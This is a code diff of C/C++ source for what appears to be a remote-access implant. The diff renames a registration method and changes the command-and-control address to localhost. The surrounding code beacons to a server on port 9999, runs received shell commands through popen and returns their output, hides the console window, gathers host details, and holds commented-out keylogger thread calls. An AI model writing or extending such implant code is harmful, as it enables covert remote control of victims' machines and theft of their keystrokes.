@@ -33,7 +33,7 @@
 #endif
 
 #define PORT 9999
-#define ADDR "192.168.2.2"
+#define ADDR "127.0.0.1"
 #define BUFFER_SIZE 4096
 #define MAX_RESPONSE 0x20000
 
@@ -62,7 +62,7 @@ class Communicate_ {
     int sock;
     public:
     int conn();
-    void reg(Device d);
+    void Register(Device d);
     void beacon(const char *id);
     void session();
     void upload();
@@ -86,7 +86,7 @@ int main() {
         int file = open(file_path, O_RDONLY);
         if (file == -1) {
             //register
-            comm.reg(d);
+            comm.Register(d);
             sleep(jitter());
             continue;
         }
@@ -154,7 +154,6 @@ void Device::hideConsole() {
 }
 #endif
 
-
 const char* Device::get_Arch() {
     #ifdef _WIN32
         SYSTEM_INFO sysInfo;
@@ -176,6 +175,8 @@ const char* Device::get_Arch() {
         }
     #endif
 }
+
+
 
 
 void Communicate_::beacon(const char *id) {
@@ -223,6 +224,7 @@ void Communicate_::beacon(const char *id) {
         //pthread_t KeyloggerThread; 
         //pthread_create(&KeyloggerThread, NULL, StartLinuxKeylogger, NULL);
         //pthread_join(KeyloggerThread, NULL);
+
         #endif
         strcpy(result, "Started keylogger Successfully");
 
@@ -246,7 +248,7 @@ void Communicate_::beacon(const char *id) {
     exec = popen(command_with_redirect, "r");
     #endif
     if (!exec) {
-        strcpy(result, "Failed to execute command.\n");
+        strcpy(result, "Failed to execute command.");
 
         goto SEND_RESULT;
     }
@@ -268,7 +270,7 @@ void Communicate_::beacon(const char *id) {
     free(result_);
 }
 
-void Communicate_::reg(Device d) {
+void Communicate_::Register(Device d) {
     char hostname[BUFFER_SIZE];
     char os[BUFFER_SIZE];
 
